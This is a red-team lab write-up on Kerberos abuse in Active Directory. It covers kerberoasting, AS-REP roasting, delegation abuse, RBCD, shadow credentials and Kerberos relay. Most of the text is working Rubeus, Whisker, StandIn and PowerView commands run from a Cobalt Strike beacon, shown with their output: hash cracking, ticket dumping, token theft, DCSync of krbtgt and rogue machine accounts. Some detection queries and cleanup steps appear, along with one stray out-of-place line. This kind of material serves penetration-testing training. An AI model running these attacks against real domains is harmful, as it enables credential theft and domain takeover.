Kerberos is a fun topic and contains some of the more well-known abuse primitives within Active Directory environments. It can also be a bit elusive as to how it works since it has so many complex intricacies, but here's a brief overview:

![overview](https://github.com/user-attachments/assets/135dae6b-9f74-42e3-9769-14cf3ec95534)

When a user logs onto their workstation, their machine will send an AS-REQ message to the Key Distribution Center (KDC), aka Domain Controller, requesting a TGT using a secret key derived from the user’s password.

The KDC verifies the secret key with the password it has stored in Active Directory for that user. Once validated, it returns the TGT in an AS-REP message. The TGT contains the user's identity and is encrypted with the KDC secret key (the krbtgt account).

When the user attempts to access a resource backed by Kerberos authentication (e.g. a file share), their machine looks up the associated Service Principal Name (SPN). It then requests (TGS-REQ) a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're a valid user.

The KDC returns a TGS (TGS-REP) for the service in question to the user, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access or not.

# Kerberoasting

Services run on a machine under the context of a user account.  These accounts are either local to the machine (LocalSystem, LocalService, NetworkService) or are domain accounts (e.g. DOMAIN\mssql).  A Service Principal Name (SPN) is a unique identifier of a service instance.  SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD.

Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service.  Kerberoasting is a technique for requesting TGS’ for services running under the context of domain accounts and cracking them offline to reveal their plaintext passwords.  Rubeus kerberoast can be used to perform the kerberoasting.  Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt).
lifeline on a slow check-in.  In which case, I can spawn a new HTTP session and work from there instead.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap
    [*] Total kerberoastable users : 3

Even though Rubeus does not include the krbtgt account, it can sometimes be cracked.

These hashes can be cracked offline to recover the plaintext passwords for the accounts.  Use --format=krb5tgs --wordlist=wordlist hashes for john or -a 0 -m 13100 hashes wordlist for hashcat.

    $ john --format=krb5tgs --wordlist=wordlist mssql_svc
    Cyberb0tic       (mssql_svc$dev.cyberbotic.io)

I experienced some hash format incompatibility with john.  Removing the SPN so it became: $krb5tgs$23$*mssql_svc$dev.cyberbotic.io*$6A9E[blah] seemed to address the issue.


- By default, Rubeus will roast every account that has an SPN.  Honey Pot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted.

Since these events will never be generated for this service, it provides a high-fidelity indication of this attack.

    event.code: 4769 and winlog.event_data.ServiceName: honey_svc

A much safer approach is to enumerate possible candidates first and roast them selectively.  This LDAP query will find domain users who have an SPN set.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

We can roast an individual account the /user parameter.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap

# ASREP Roasting 

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.  This configuration is enabled on the User Object and is often seen on accounts that are associated with Linux systems.

![preauth](https://github.com/user-attachments/assets/a2f8499a-21c7-495f-b041-5e1a86c5b1cb)

As with kerberoasting, we don't want to asreproast every account in the domain.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
    [*] TOTAL NUMBER OF SEARCH RESULTS: 1
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

Use --format=krb5asrep --wordlist=wordlist squid_svc for john or -a 0 -m 18200 squid_svc wordlist for hashcat.

    $ john --format=krb5asrep --wordlist=wordlist squid_svc
    Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)

ASREPRoasting with will generate a 4768 event with RC4 encryption and a preauth type of 0.

    event.code: 4768 and winlog.event_data.PreAuthType: 0 and winlog.event_data.TicketEncryptionType: 0x17

# Unconstrained Delegation 

Delegation allows a user or machine to act on behalf of another user to another service.  A common implementation of this is where a user authenticates to a front-end web application that serves a back-end database.  The front-end application needs to authenticate to the back-end database (using Kerberos) as the authenticated user.

![unconstrained](https://github.com/user-attachments/assets/ca7c9d99-c8f5-4a2c-b03f-34761c981b40)

We know how a user performs Kerberos authentication to the Web Server, but how can the Web Server authenticate to the DB and perform actions as the user?  Unconstrained Delegation was the first solution to this problem, introduced in Windows 2000.  When configured on a computer, the KDC includes a copy of the user's TGT inside the TGS.  In this example, when the user accesses the Web Server, it extracts the user's TGT from the TGS and caches it in memory.  When the Web Server needs to access the DB Server on behalf of that user, it uses the user’s TGT to request a TGS for the database service.

An interesting aspect to unconstrained delegation is that it will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached.  If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the users against other services in the domain.

This query will return all computers that are permitted for unconstrained delegation.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

- Domain Controllers are always permitted for unconstrained delegation.

If we compromise WEB$ and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.  Interaction can be via any Kerberos service, so something as simple as dir \\web\c$ is enough.  Rubeus triage will show all the tickets that are currently cached.  TGTs can be identified by the krbtgt service.

    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

There is a scheduled task running on Workstation 1 as nlamb that will interact with WEB$ every 5 minutes.  If the ticket is not there, wait a minute or so and try again.

We can simply extract this TGT and leverage it via a new logon session.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
    doIFwj [...snip...] MuSU8=
    
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
    
    [*] Using DEV\nlamb:FakePass
    
    [*] Showing process : False
    [*] Username        : nlamb
    [*] Domain          : DEV
    [*] Password        : FakePass
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 1540
    [+] Ticket successfully imported!
    [+] LUID            : 0x3206fb
    
    beacon> steal_token 1540
    
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

We can also obtain TGTs for computer accounts by forcing them to authenticate remotely to this machine.  As mentioned in the NTLM Relaying module of the Pivoting chapter, several tools exist to facilitate this.  This time, we will force the domain controller to authenticate to the web server to steal its TGT.

We will also utilise Rubeus' monitor command.  This will drop into loop and continuously monitor for and extract new TGT as they get cached.  It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

    [*] Action: TGT Monitoring
    [*] Monitoring every 10 seconds for new TGTs

Next, run SharpSpoolTrigger.

    beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

Where:

- DC-2 is the "target".
- WEB is the "listener".

Rubeus will then capture the ticket.

    [*] 9/6/2022 2:44:52 PM UTC - Found new TGT:
    
    User                  :  DC-2$@DEV.CYBERBOTIC.IO
    StartTime             :  9/6/2022 9:06:14 AM
    EndTime               :  9/6/2022 7:06:14 PM
    RenewTill             :  9/13/2022 9:06:14 AM
    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    Base64EncodedTicket   :
    doIFuj[...]lDLklP

Machine TGTs are leveraged slightly differently - see the S4U2Self Abuse module.  To stop Rubeus, use the jobs and jobkill commands.

# Constrained Delegation

Constrained delegation was later introduced with Windows Server 2003 as a safer means for services to perform Kerberos delegation.  It aims to restrict the services to which the server can act on behalf of a user.  It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.

![sql-2](https://github.com/user-attachments/assets/a4cb6608-d952-4c8d-ae69-6f36be523fb1)

In this case, SQL-2 can act on behalf of any user to the cifs service on DC-2.  CIFS is quite powerful as it allows you to list file shares and transfer files.  To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty.

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
    
    [*] TOTAL NUMBER OF SEARCH RESULTS: 1
    [
    {
    "dnshostname": "sql-2.dev.cyberbotic.io",
    "samaccountname": "SQL-2$",
    "msds-allowedtodelegateto": [
      "cifs/dc-2.dev.cyberbotic.io/dev.cyberbotic.io",
      "cifs/dc-2.dev.cyberbotic.io",
      "cifs/DC-2",
      "cifs/dc-2.dev.cyberbotic.io/DEV",
      "cifs/DC-2/DEV"
    ]
    }
    ]

Constrained delegation can be configured on user accounts as well as computer accounts.  Make sure you search for both.

To perform the delegation, we need the TGT of the principal (computer or user) trusted for delegation.  The most direct way is to extract it with Rubeus dump:

      beacon> run hostname
      sql-2
      
      beacon> getuid
      [*] You are NT AUTHORITY\SYSTEM (admin)
      
      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap


You can also request one with Rubeus asktgt if you have NTLM or AES hashes.

With the TGT, perform an S4U request to obtain a usable TGS for CIFS on DC-2.  Remember that we can impersonate any user in the domain, but we want someone who we know to be a local admin on the target.  In this case, a domain admin makes the most sense.

This will perform an S4U2Self first and then an S4U2Proxy. 

      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap
      
      [*] Action: S4U
      [*] Building S4U2self request for: 'SQL-2$@DEV.CYBERBOTIC.IO'
      [*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
      [*] Sending S4U2self request to 10.10.122.10:88
      [+] S4U2self success!
      [*] Got a TGS for 'nlamb' to 'SQL-2$@DEV.CYBERBOTIC.IO'
      [*] base64(ticket.kirbi):

      doIFnD[...]FMLTIk
      
      [*] Impersonating user 'nlamb' to target SPN 'cifs/dc-2.dev.cyberbotic.io'
      [*] Building S4U2proxy request for service: 'cifs/dc-2.dev.cyberbotic.io'
      [*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.122.10)
      [*] Sending S4U2proxy request to domain controller 10.10.122.10:88
      [+] S4U2proxy success!
      [*] base64(ticket.kirbi) for SPN 'cifs/dc-2.dev.cyberbotic.io':

      doIGaD[...]ljLmlv
      
where:

- /impersonateuser is the user we want to impersonate.
- /msdsspn is the service principal name that SQL-2 is allowed to delegate to.
- /user is the principal allowed to perform the delegation.
- /ticket is the TGT for /user.

Grab the final S4U2Proxy ticket and pass it into a new logon session.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

    [*] Using DEV\nlamb:FakePass
    
    [*] Showing process : False
    [*] Username        : nlamb
    [*] Domain          : DEV
    [*] Password        : FakePass
    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
    [+] ProcessID       : 5540
    [+] Ticket successfully imported!
    [+] LUID            : 0x3d3194
    
    beacon> steal_token 5540
    
    beacon> ls \\dc-2.dev.cyberbotic.io\c$


Make sure to always use the FQDN.  Otherwise, you will see 1326 errors.

    beacon> ls \\dc-2\c$
    [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE

# Alternate Service Name 

The CIFS service can be leveraged for listing and transferring files, but what if port 445 was unavailable or we wanted an option for lateral movement?

In the Kerberos authentication protocol, a service validates an inbound ticket by ensuring that it's encrypted with that service's symmetric key.  This key is derived from the password hash of the principal running the service.  Most services run in the SYSTEM context of a computer account, e.g. SQL-2$.  Therefore, all service tickets, whether they be for CIFS, TIME, or HOST, etc, will be encrypted with the same key.  The SPN does not factor into ticket validation.

Furthermore, the SPN information in the ticket (i.e. the sname field) is not encrypted and can be changed arbitrarily.  That means we can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it happily.

This was originally discovered by Alberto Solino and confirmed as "by design" by Microsoft.

We can be abuse this using /altservice flag in Rubeus.  In this example, I'm using the same TGT for SQL-2 to request a TGS for LDAP instead of CIFS.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

    [*] Action: S4U


    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv
	
    [*] Using DEV\nlamb:FakePass

    beacon> steal_token 2580

Against a domain controller, the LDAP service allows us to perform a dcsync.

    beacon> dcsync dev.cyberbotic.io DEV\krbtgt


# Service for User to Self (S4U2Self) Abuse

As we saw in the previous two examples of constrained delegation, there are two S4U (Service for User) extensions.  S4U2Self (Service for User to Self) and S4U2Proxy (Service for User to Proxy).  S4U2Self allows a service to obtain a TGS to itself on behalf of a user, and S4U2Proxy allows the service to obtain a TGS on behalf of a user to a second service.

When we abused constrained delegation, we did: Rubeus s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$.  From the output, we saw Rubeus first builds an S4U2Self request and obtains a TGS for nlamb to sql-2/dev.cyberbotic.io.  It then builds an S4U2Proxy request to obtain a TGS for nlamb to cifs/dc-2.dev.cyberbotic.io.

This is obviously working by design because SQL-2 is specifically trusted for delegation to that service.  However, there's another particularly useful way, published by Elad Shamir, to abuse the S4U2Self extension - and that is to gain access to a computer if we have its TGT.

In the Unconstrained Delegation module, we obtained a TGT for the domain controller.  If you tried to pass that ticket into a logon session and use it to access the C$ share (like we would with a user TGT), it would fail.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj[...]lDLklP

    [*] Using DEV\DC-2$:FakePass


    beacon> steal_token 2832
    
    beacon> ls \\dc-2.dev.cyberbotic.io\c$
    [-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

This is because machines do not get remote local admin access to themselves.  What we can do instead is abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin).  Rubeus has a /self flag for this purpose.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

    [*] Action: S4U

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

    beacon> steal_token 2664

    beacon> ls \\dc-2.dev.cyberbotic.io\c$

# Resource-Based Constrained Delegation (RBCD)

Enabling unconstrained or constrained delegation on a computer requires the SeEnableDelegationPrivilege user right assignment on domain controllers, which is only granted to enterprise and domain admins.  Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source.

To compare - constrained delegation is configured on the "front-end" service via its msDS-AllowedToDelegateTo attribute.  The example provided previously was where cifs/dc-2.dev.cyberbotic.io was in the msDS-AllowedToDelegateTo attribute of SQL-2.  This allowed the SQL-2 computer account to impersonate any user to any service on DC-2, and DC-2 really had no "say" over it.

RBCD reverses this concept and puts control in the hands of the "backend" service instead, via a new attribute called msDS-AllowedToActOnBehalfOfOtherIdentity.  This attribute also does not require SeEnableDelegationPrivilege to modify.  Instead, you only need a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on the computer object.  This makes it much more likely to present itself as a privilege escalation / lateral movement opportunity.

The two major prerequisites to pull off the attack are:

1. A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity.
2. Control of another principal that has an SPN.

This query will obtain every domain computer and read their ACL, filtering on the interesting rights.  This will produce a handful of results, but the one shown is the one of interest.  It shows that the Developers group has WriteProperty rights on all properties (see the ObjectAceType) for DC-2.

	beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

	beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
	DEV\Developers

A common means of obtaining a principal with an SPN is to use a computer account.  Since we have elevated privileges on Workstation 2, we can use that.  To start the attack, we need its SID.

	beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid
	objectsid                                   
	---------                                   
	S-1-5-21-569305411-121244042-2357301523-1109

We'll then use this inside an SDDL to create a security descriptor.  The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format.

	$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
	$rsdb = New-Object byte[] ($rsd.BinaryLength)
	$rsd.GetBinaryForm($rsdb, 0)
	
These descriptor bytes can then be used with Set-DomainObject.  However, since we're working through Cobalt Strike, everything has to be concatenated into a single PowerShell command.

	beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
	
	Setting 'msDS-AllowedToActOnBehalfOfOtherIdentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 67 233 238 33 138 9 58 7 19 145 129 140 85 4 0 0' for object 'DC-2$'
	
	beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
	
	msds-allowedtoactonbehalfofotheridentity
	----------------------------------------
	{1, 0, 4, 128...}

Next, we use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The s4u command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

	[*] Current LUID    : 0x3e7

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

Then perform the s4u.

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

Finally, pass the ticket into a logon session for use.

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=

	[*] Using DEV\nlamb:FakePass

	beacon> steal_token 4092
	[+] Impersonated DEV\bfarmer
	
	beacon> ls \\dc-2.dev.cyberbotic.io\c$

To clear up, simply remove the msDS-AllowedToActOnBehalfOfOtherIdentity entry on the target.

	beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

If you did not have local admin access to a computer already, you can resort to creating your own computer object.  By default, even domain users can join up to 10 computers to a domain - controlled via the ms-DS-MachineAccountQuota attribute of the domain object.

	beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

	ms-ds-machineaccountquota
	-------------------------
	                       10

StandIn is a post-ex toolkit written by Ruben Boonen and has the functionality to create a computer with a random password.

	beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
	
	[?] Using DC    : dc-2.dev.cyberbotic.io
	    |_ Domain   : dev.cyberbotic.io
	    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
	    |_ Password : oIrpupAtF1YCXaw
	
	[+] Machine account added to AD..


Rubeus hash can take that password and calculate their hashes.

	PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
	
	[*] Action: Calculate Password Hash(es)
	
	[*] Input password             : oIrpupAtF1YCXaw
	[*] Input username             : EvilComputer$
	[*] Input domain               : dev.cyberbotic.io
	[*] Salt                       : DEV.CYBERBOTIC.IOhostevilcomputer.dev.cyberbotic.io
	[*]       rc4_hmac             : 73D0774058830F841C9205C857C9EE62
	[*]       aes128_cts_hmac_sha1 : FB9A1AB8567D4EF4CEA6186A115D091A
	[*]       aes256_cts_hmac_sha1 : 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
	[*]       des_cbc_md5          : 49B5514F1F45700D

These can then be used with asktgt to obtain a TGT for the fake computer.

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
	
	[*] Action: Ask TGT
	
	[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
	[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
	[*] Using domain controller: 10.10.122.10:88
	[+] TGT request successful!
	[*] base64(ticket.kirbi):
	
	      doIF8j[...]MuaW8=

	  ServiceName              :  krbtgt/dev.cyberbotic.io
	  ServiceRealm             :  DEV.CYBERBOTIC.IO
	  UserName                 :  EvilComputer$
	  UserRealm                :  DEV.CYBERBOTIC.IO
	  StartTime                :  9/13/2022 2:31:34 PM
	  EndTime                  :  9/14/2022 12:31:34 AM
	  RenewTill                :  9/20/2022 2:31:34 PM
	  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	  KeyType                  :  aes256_cts_hmac_sha1
	  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
	  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044


And the rest of the attack is the same.

# Shadow Credentials

Whilst Kerberos pre-authentication is typically carried out using a symmetric key derived from a client's password, asymmetric keys are also possible via Public Key Cryptography for Initial Authentication (PKINIT).  If a PKI solution is in place, such as Active Directory Certificate Services, the domain controllers and domain members exchange their public keys via the appropriate Certificate Authority.  This is called the Certificate Trust model.

There is also a Key Trust model, where trust is established based on raw key data rather than a certificate.  This requires a client to store their key on their own domain object, in an attribute called msDS-KeyCredentialLink.  The basis of the "shadow credentials" attack is that if you can write to this attribute on a user or computer object, you can obtain a TGT for that principal.  As such, this is a DACL-style abuse as with RBCD.

Along with his excellent blog post on the subject, Elad Shamir published a tool called Whisker, which makes exploiting this very easy.  First, we want to list any keys that might already be present for a target - this is important for when we want to clean up later.

	beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
	[*] Searching for the target account
	[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
	[*] Listing deviced for dc-2$:
	[*] No entries!

Add a new key pair to the target.

	beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
	[*] No path was provided. The certificate will be printed as a Base64 blob
	[*] No pass was provided. The certificate will be stored with the password y52EhYqlfgnYPuRb
	[*] Searching for the target account
	[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
	[*] Generating certificate
	[*] Certificate generaged
	[*] Generating KeyCredential
	[*] KeyCredential generated with DeviceID 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
	[*] Updating the msDS-KeyCredentialLink attribute of the target object
	[+] Updated the msDS-KeyCredentialLink attribute of the target object

And now, we can ask for a TGT using the Rubeus command that Whisker provides.

	beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap
	
	[*] Using PKINIT with etype rc4_hmac and subject: CN=dc-2$ 
	[*] Building AS-REQ (w/ PKINIT preauth) for: 'dev.cyberbotic.io\dc-2$'
	[*] Using domain controller: 10.10.122.10:88
	[+] TGT request successful!
	[*] base64(ticket.kirbi):
	
	doIGaj [...snip...] MuaW8=
	
	  ServiceName              :  krbtgt/dev.cyberbotic.io
	  ServiceRealm             :  DEV.CYBERBOTIC.IO
	  UserName                 :  dc-2$
	  UserRealm                :  DEV.CYBERBOTIC.IO
	  StartTime                :  1/21/2023 7:12:27 PM
	  EndTime                  :  1/22/2023 5:12:27 AM
	  RenewTill                :  1/28/2023 7:12:27 PM
	  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
	  KeyType                  :  rc4_hmac
	  Base64(key)              :  bKJ76Br5CFOL6zckBpl9IA==
	  ASREP (key)              :  B0AA392AE0C969E268DAC4462D76FC90


Whisker's clear command will remove any and all keys from msDS-KeyCredentialLink.  This is a bad idea if a key was already present, because it will break legitimate passwordless authentication that was in place.  If this was the case, you can list the entries again and only remove the one you want.

	beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
	[*] Searching for the target account
	[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
	[*] Listing deviced for dc-2$:
	    DeviceID: 58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403 | Creation Time: 1/21/2023 7:19:04 PM
	
	beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:58d0ccec-1f8c-4c7a-8f7e-eb77bc9be403
	[*] Searching for the target account
	[*] Target user found: CN=DC-2,OU=Domain Controllers,DC=dev,DC=cyberbotic,DC=io
	[*] Updating the msDS-KeyCredentialLink attribute of the target object
	[+] Found value to remove
	[+] Updated the msDS-KeyCredentialLink attribute of the target object
	
# Keberos Relay Attacks

Using Kerberos for Authentication Relay Attacks was published by James Foreshaw in 2021, in which he discusses the possibility of relaying Kerberos authentication in a Windows domain without MitM. It's a fairly heavy read but obviously contains all the granular details. This lesson will attempt to summarise the key points and demonstrate two popular attack vectors for LPE on domain-joined hosts.

One major challenge in relaying Kerberos is that service tickets are encrypted with the service's secret key. A ticket for CIFS/HOST-A cannot be relayed to CIFS/HOST-B because HOST-B would be unable to decrypt a ticket that was encrypted for HOST-A. However, in Windows, the service's secret key is derived from the principal associated with its SPN and is not necessarily unique per-service. Most services run as the local SYSTEM, which in a domain context, is the computer account in Active Directory. Therefore, service tickets for services run on the same host, such as CIFS/HOST-A and HTTP/HOST-A, would be encrypted with the same key.

As James puts it - "there's nothing inherently stopping Kerberos authentication being relayed if the attacker can control the SPN", but until now, we have not had a way to do this. One method for achieving it is detailed in his post: Windows Exploitation Tricks: Relaying DCOM Authentication. The demonstrated approach is very similar to how the RemotePotato exploit works - stand up a local listener and coerce a privileged COM server into connecting to it; capture the subsequent authentication request and relay it somewhere else.  Again, there are a lot of nuanced detail in James' post, but these are the highlights.

The attacker starts a malicious RPC server that will force connecting clients to authenticate to it using Kerberos only, and by using appropriate security bindings, they can specify a completely arbitrary SPN. This will force a service ticket to be generated for a service/SPN that that attacker doesn't control, such as HOST/DC. They then coerce a privileged COM server into connecting to their malicious RPC server, which will perform the authentication and generate the appropriate Kerberos tickets. In this example, the malicious RPC server would receive a KRB_AP_REQ for HOST/DC as the local computer account, which the attacker can relay to LDAP/DC instead. With a valid service ticket for LDAP, they can submit requests to the DC as the computer account to modify the computer object in Active Directory. This opens the door for other attacker primitives like RBCD and shadow credentials in order to achieve the LPE.

It's worth noting that if signing or channel binding are enabled then these attacks are not possible. Thankfully (or not, depending on your point of view), signing is still disabled by default, even on critical protocols such as LDAP.

There are tools such as KrbRelayUp that automate most of the exploitation steps required, but we'll do them manually.  The primary reason is:
1. That we understand all of the steps in more detail
2. We know how and what clean-up afterwards (which these tools often omit).  For the relaying, we'll use the original KrbRelay tool by cube0x0; and for the LPE, tools we're already familiar with including StandIn, Whisker, and Rubeus.

